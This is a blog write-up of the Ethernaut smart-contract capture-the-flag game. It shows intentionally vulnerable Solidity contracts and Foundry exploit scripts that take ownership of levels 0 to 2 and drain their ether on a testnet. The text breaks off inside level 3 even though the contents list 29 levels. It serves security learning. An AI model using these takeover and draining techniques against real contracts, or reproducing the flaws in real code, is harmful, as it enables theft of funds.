<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         Ethernaut CTF
        
    </title><meta content="Ethernaut CTF" property=og:title><link href=/favicons/favicon.ico rel=icon type=image/png><link href=https://themj0ln1r.github.io/fonts.css rel=stylesheet><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel=stylesheet><script async data-goatcounter=https://themj0ln1r.goatcounter.com/count src=https://themj0ln1r.github.io/js/count.js></script><noscript><img src="https://themj0ln1r.goatcounter.com//count?p=/archive/ethernaut/&t=Ethernaut CTF"></noscript><script src=https://themj0ln1r.github.io/js/codeblock.js></script><script src=https://themj0ln1r.github.io/js/toc.js></script><script src=https://themj0ln1r.github.io/js/note.js></script><script>MathJax = {
              tex: {
                inlineMath: [['$', '$'], ['\\(', '\\)']]
              }
            };</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><link title="TheMj0ln1r Blog" href=https://themj0ln1r.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://themj0ln1r.github.io/theme/light.css rel=stylesheet><link href=https://themj0ln1r.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><script src=https://themj0ln1r.github.io/js/themetoggle.js></script><script>setTheme(getSavedTheme());</script><link href=https://themj0ln1r.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://themj0ln1r.github.io/><b>TheMj0ln1r Blog</b></a><div class=socials></div></div><nav><a href=https://themj0ln1r.github.io/cv style=margin-left:.5em><b>CV</b></a><a href=https://themj0ln1r.github.io/archive style=margin-left:.5em><b>Archive</b></a><a href=https://themj0ln1r.github.io/tags style=margin-left:.5em><b>Tags</b></a> |<a onclick="toggleTheme(); event.preventDefault();" href=# id=dark-mode-toggle> <img alt=Light id=sun-icon src=https://themj0ln1r.github.io/feather/sun.svg style=filter:invert()> <img alt=Dark id=moon-icon src=https://themj0ln1r.github.io/feather/moon.svg> </a><script>updateItemToggleTheme()</script></nav></header><main><article><div class=title><div class=page-header>Ethernaut CTF</div><div class=meta>Posted on <time>2023-12-09</time><span class=tags-label> :: Tags:</span><span class=tags> <a class=post-tag href=https://themj0ln1r.github.io/tags/ctf/>ctf</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/blockchain/>blockchain</a> </span> :: <a rel="noopener noreferrer" href=https://github.com/TheMj0ln1r/ethernaut-foundryarchive/2023-12-09-ethernaut.md target=_blank> Source Code</a></div></div><div class=toc-container><h5 class=toc-title>Table of Contents</h5><ul class=toc-list><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#0-hello-ethernaut>0 Hello Ethernaut</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#1-fallback>1 Fallback</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#2-fallout>2 Fallout</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#3-coin-flip>3 Coin Flip</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#4-telephone>4 Telephone</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#5-token>5 Token</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#6-delegation>6 Delegation</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#7-force>7 Force</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#8-vault>8 Vault</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#9-king>9 King</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#10-reentrancy>10 Reentrancy</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#11-elevator>11 Elevator</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#12-privacy>12 Privacy</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#13-gatekeeper-one>13 Gatekeeper One</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#14-gatekeeper-two>14 Gatekeeper Two</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#15-naught-coin>15 Naught Coin</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#16-preservation>16 Preservation</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#17-recovery>17 Recovery</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#18-magic-number>18 Magic Number</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#19-alien-codex>19 Alien Codex</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#20-denial>20 Denial</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#21-shop>21 Shop</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#22-dex>22 Dex</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#23-dex-two>23 Dex Two</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#24-puzzle-wallet>24 Puzzle Wallet</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#25-motorbike>25 Motorbike</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#26-double-entry-point>26 Double Entry Point</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#27-good-samaritan>27 Good Samaritan</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#28-gatekeeper-three>28 Gatekeeper Three</a><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#29-switch>29 Switch</a> <ul><li><a href=https://themj0ln1r.github.io/archive/ethernaut/#references>References</a></ul></ul></div><section class=body><p>Hello internet, I am learning web3 security by doing blockchain CTF challenges. To get to know more common vulnerabilities and put my learning knowledge from secureum bootcamp in practice I have solved <a href=https://ethernaut.openzeppelin.com/ target=_blank>ethernaut</a> CTF challenges powered by OpenZeppelin. I have solved all these challenges by using foundry to get my hands dirty with foundry. I recommend to go through the ethereum101, solidity 101 and solidity 201 modules of the secureum bootcamp before taking up these challenges.<p>This repository can be useful as a template for the people who want's to solve ethernaut by using foundry. I will try my best to explain the solutions to challenges.<blockquote><p>Solution Repo : <a href=https://github.com/TheMj0ln1r/ethernaut-foundry target=_blank>https://github.com/TheMj0ln1r/ethernaut-foundry</a></blockquote><p>Setup the codebase locally :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ git clone https://github.com/TheMj0ln1r/ethernaut-foundry.git
</span><span>$ cd ethernaut-foundry
</span></code></pre><p>The challenge contracts are in <code>/src</code><p>Solution scripts under <code>/script</code><p>You need to add a <code>.env</code> file and fill following required fieds.<pre style=color:#323232;background-color:#fff><code><span>RPC_URL=
</span><span>MY_ADDRESS=
</span><span>PRIVATE_KEY=
</span></code></pre><p>Get some Sepolia Eth to your address. (I am using Sepolia Testnet to solve)<h1 id=0-hello-ethernaut>0 Hello Ethernaut</h1><p>This is a sanity check challenge to the ethernaut. The source code was given to us. We have to deploy the instance and call the <code>info()</code> method on it and follow the instructions to solve the challenge.<p><code>level0.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract Instance {
</span><span>
</span><span>  string public password;
</span><span>  uint8 public infoNum </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>42</span><span>;
</span><span>  string public theMethodName </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#183691>'The method name is method7123949.'</span><span>;
</span><span>  bool private cleared </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>false</span><span>;
</span><span>
</span><span>  </span><span style=color:#969896;font-style:italic>// constructor
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>(string memory _password) public {
</span><span>    password </span><span style=color:#a71d5d;font-weight:700>= </span><span>_password;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>info</span><span>() </span><span style=color:#795da3;font-weight:700>public pure returns </span><span>(string memory) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#183691>'You will find what you need in info1().'</span><span>;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>info1</span><span>() </span><span style=color:#795da3;font-weight:700>public pure returns </span><span>(string memory) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#183691>'Try info2(), but with "hello" as a parameter.'</span><span>;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>info2</span><span>(string memory param) </span><span style=color:#795da3;font-weight:700>public pure returns </span><span>(string memory) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if</span><span>(</span><span style=color:#795da3;font-weight:700>keccak256</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encodePacked</span><span>(param)) </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#795da3;font-weight:700>keccak256</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encodePacked</span><span>(</span><span style=color:#183691>'hello'</span><span>))) {
</span><span>      </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#183691>'The property infoNum holds the number of the next info method to call.'</span><span>;
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#183691>'Wrong parameter.'</span><span>;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>info42</span><span>() </span><span style=color:#795da3;font-weight:700>public pure returns </span><span>(string memory) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#183691>'theMethodName is the name of the next method.'</span><span>;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>method7123949</span><span>() </span><span style=color:#795da3;font-weight:700>public pure returns </span><span>(string memory) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#183691>'If you know the password, submit it to authenticate().'</span><span>;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>authenticate</span><span>(string memory passkey) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if</span><span>(</span><span style=color:#795da3;font-weight:700>keccak256</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encodePacked</span><span>(passkey)) </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#795da3;font-weight:700>keccak256</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encodePacked</span><span>(password))) {
</span><span>      cleared </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>    }
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getCleared</span><span>() </span><span style=color:#795da3;font-weight:700>public view returns </span><span>(bool) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span>cleared;
</span><span>  }
</span><span>}
</span><span>
</span></code></pre><p><code>level0Solve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Instance} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"src/level0.sol"</span><span>;
</span><span>
</span><span>contract Level0Solve is Script{
</span><span>    Instance public Level0 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Instance</span><span>(</span><span style=color:#0086b3>0xc770F44bFDAe8eD857FaBeaFF5A702B87eAeC331</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        string memory password </span><span style=color:#a71d5d;font-weight:700>= </span><span>Level0.</span><span style=color:#795da3;font-weight:700>password</span><span>();
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Password : "</span><span>, password);
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        Level0.</span><span style=color:#795da3;font-weight:700>authenticate</span><span>(password);
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/level0Solve.s.sol:Level0Solve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=1-fallback>1 Fallback</h1><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract Fallback {
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>mapping</span><span>(address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>uint) public contributions;
</span><span>  address public owner;
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>() {
</span><span>    owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>    contributions[msg.sender] </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>1000 </span><span style=color:#a71d5d;font-weight:700>* </span><span>(</span><span style=color:#0086b3>1 </span><span>ether);
</span><span>  }
</span><span>
</span><span>  modifier onlyOwner {
</span><span>        </span><span style=color:#62a35c>require</span><span>(
</span><span>            msg.sender </span><span style=color:#a71d5d;font-weight:700>== </span><span>owner,
</span><span>            </span><span style=color:#183691>"caller is not the owner"
</span><span>        );
</span><span>        _;
</span><span>    }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>contribute</span><span>() </span><span style=color:#795da3;font-weight:700>public payable </span><span>{
</span><span>    </span><span style=color:#62a35c>require</span><span>(msg.value </span><span style=color:#a71d5d;font-weight:700>&lt; </span><span style=color:#0086b3>0.001 </span><span>ether);
</span><span>    contributions[msg.sender] </span><span style=color:#a71d5d;font-weight:700>+= </span><span>msg.value;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if</span><span>(contributions[msg.sender] </span><span style=color:#a71d5d;font-weight:700>> </span><span>contributions[owner]) {
</span><span>      owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>    }
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getContribution</span><span>() </span><span style=color:#795da3;font-weight:700>public view returns </span><span>(uint) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span>contributions[msg.sender];
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>withdraw</span><span>() </span><span style=color:#795da3;font-weight:700>public onlyOwner </span><span>{
</span><span>    </span><span style=color:#795da3;font-weight:700>payable</span><span>(owner).</span><span style=color:#795da3;font-weight:700>transfer</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this).balance);
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>receive</span><span>() external payable {
</span><span>    </span><span style=color:#62a35c>require</span><span>(msg.value </span><span style=color:#a71d5d;font-weight:700>> </span><span style=color:#0086b3>0 </span><span style=color:#a71d5d;font-weight:700>&& </span><span>contributions[msg.sender] </span><span style=color:#a71d5d;font-weight:700>> </span><span style=color:#0086b3>0</span><span>);
</span><span>    owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>  }
</span><span>}
</span></code></pre><ul><li>Goal :</ul><ol><li>Our goal is to become the owner of the contract and drain all the ether of it</ol><ul><li>Solution :</ul><ol><li>Fallback contract sets the owner variable in <code>receive()</code> function.<li>To set the owner we need to pass the require check in <code>receive()</code><li>To pass the check we have to send some ether with the <code>TX</code> and our sender should have some contributions in it.<li>So, Initially we will send contributions and then send some ether to the contract to invoke the <code>receive()</code> method.<li>After we sent the new owner as ourselves, we can call <code>withdraw()</code> function to drain the contract.</ol><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Fallback} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"src/Fallback.sol"</span><span>;
</span><span>
</span><span>contract Level0Solve is Script{
</span><span>    Fallback public level1 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Fallback</span><span>(</span><span style=color:#795da3;font-weight:700>payable</span><span>(</span><span style=color:#0086b3>0x67B71283A3a53C445f33Ea0a0F8E435cD1f283E1</span><span>));
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Original Owner : "</span><span>, level1.</span><span style=color:#795da3;font-weight:700>owner</span><span>());        
</span><span>        
</span><span>        level1.contribute{value: </span><span style=color:#0086b3>0.0001 </span><span>ether}();
</span><span>        </span><span style=color:#795da3;font-weight:700>address</span><span>(level1).call{value: </span><span style=color:#0086b3>1 </span><span>wei}(</span><span style=color:#183691>""</span><span>);
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"New Owner : "</span><span>, level1.</span><span style=color:#795da3;font-weight:700>owner</span><span>());
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Initial Balance : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(level1).balance);
</span><span>        level1.</span><span style=color:#795da3;font-weight:700>withdraw</span><span>();
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Final Balance : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(level1).balance);
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/FallbackSolve.s.sol:FallbackSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=2-fallout>2 Fallout</h1><p><code>Fallout.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.6</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>'@openzeppelin-contracts-06/contracts/math/SafeMath.sol'</span><span>;
</span><span>
</span><span>contract Fallout {
</span><span>  
</span><span>  using SafeMath for uint256;
</span><span>  </span><span style=color:#795da3;font-weight:700>mapping </span><span>(address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>uint) allocations;
</span><span>  address payable public owner;
</span><span>
</span><span>
</span><span>  </span><span style=color:#969896;font-style:italic>/* constructor */
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>Fal1out</span><span>() </span><span style=color:#795da3;font-weight:700>public payable </span><span>{
</span><span>    owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>    allocations[owner] </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.value;
</span><span>  }
</span><span>
</span><span>  modifier onlyOwner {
</span><span>	        </span><span style=color:#62a35c>require</span><span>(
</span><span>	            msg.sender </span><span style=color:#a71d5d;font-weight:700>== </span><span>owner,
</span><span>	            </span><span style=color:#183691>"caller is not the owner"
</span><span>	        );
</span><span>	        _;
</span><span>	    }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>allocate</span><span>() </span><span style=color:#795da3;font-weight:700>public payable </span><span>{
</span><span>    allocations[msg.sender] </span><span style=color:#a71d5d;font-weight:700>= </span><span>allocations[msg.sender].</span><span style=color:#62a35c>add</span><span>(msg.value);
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>sendAllocation</span><span>(address payable allocator) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#62a35c>require</span><span>(allocations[allocator] </span><span style=color:#a71d5d;font-weight:700>> </span><span style=color:#0086b3>0</span><span>);
</span><span>    allocator.</span><span style=color:#795da3;font-weight:700>transfer</span><span>(allocations[allocator]);
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>collectAllocations</span><span>() </span><span style=color:#795da3;font-weight:700>public onlyOwner </span><span>{
</span><span>    msg.sender.</span><span style=color:#795da3;font-weight:700>transfer</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this).balance);
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>allocatorBalance</span><span>(address allocator) </span><span style=color:#795da3;font-weight:700>public view returns </span><span>(uint) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span>allocations[allocator];
</span><span>  }
</span><span>}
</span></code></pre><ul><li>Goal :</ul><ol><li>Claim the ownership of the contract</ol><ul><li>Solution</ul><ol><li>In solidity <code>0.6.0</code> the constructor of the contract is the name of the contract, later it was replaced with <code>constructor</code> keyword.<li>Here in this contract the constructor sets up the <code>owner</code>.<li>But the function <code>Fal1out()</code> is not actually a constructor, because its not same as the contract name.<li>So, we can call this function and claim the ownership.</ol><p><code>FalloutSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.6</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Fallout} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/Fallout.sol"</span><span>;
</span><span>
</span><span>contract FalloutSolve is Script{
</span><span>    Fallout public level2 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Fallout</span><span>(</span><span style=color:#0086b3>0xf66ffe7e1e2663E19fec83F39256cc3Af3513000</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Original Owner : "</span><span>, level2.</span><span style=color:#795da3;font-weight:700>owner</span><span>());
</span><span>        level2.</span><span style=color:#795da3;font-weight:700>Fal1out</span><span>();
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"New Owner : "</span><span>, level2.</span><span style=color:#795da3;font-weight:700>owner</span><span>());
</span><span>        level2.</span><span style=color:#795da3;font-weight:700>collectAllocations</span><span>();
</span><span>
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/FalloutSolve.s.sol:FalloutSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=3-coin-flip>3 Coin Flip</h1><p><code>CoinFlip.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract CoinFlip {
</span><span>
</span><span>  uint256 public consecutiveWins;
</span><span>  uint256 lastHash;
</span><span>  uint256 </span><span style=color:#0086b3>FACTOR </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span>;
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>() {
</span><span>    consecutiveWins </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0</span><span>;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>flip</span><span>(bool _guess) </span><span style=color:#795da3;font-weight:700>public returns </span><span>(bool) {
</span><span>    uint256 blockValue </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>uint256</span><span>(</span><span style=color:#795da3;font-weight:700>blockhash</span><span>(block.number </span><span style=color:#a71d5d;font-weight:700>- </span><span style=color:#0086b3>1</span><span>));
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(lastHash </span><span style=color:#a71d5d;font-weight:700>== </span><span>blockValue) {
</span><span>      </span><span style=color:#795da3;font-weight:700>revert</span><span>();
</span><span>    }
</span><span>
</span><span>    lastHash </span><span style=color:#a71d5d;font-weight:700>= </span><span>blockValue;
</span><span>    uint256 coinFlip </span><span style=color:#a71d5d;font-weight:700>= </span><span>blockValue </span><span style=color:#a71d5d;font-weight:700>/ </span><span style=color:#0086b3>FACTOR</span><span>;
</span><span>    bool side </span><span style=color:#a71d5d;font-weight:700>= </span><span>coinFlip </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>1 </span><span style=color:#a71d5d;font-weight:700>? </span><span style=color:#0086b3>true </span><span style=color:#a71d5d;font-weight:700>: </span><span style=color:#0086b3>false</span><span>;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(side </span><span style=color:#a71d5d;font-weight:700>== </span><span>_guess) {
</span><span>      consecutiveWins</span><span style=color:#a71d5d;font-weight:700>++</span><span>;
</span><span>      </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>    } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>      consecutiveWins </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0</span><span>;
</span><span>      </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>false</span><span>;
</span><span>    }
</span><span>  }
</span><span>}
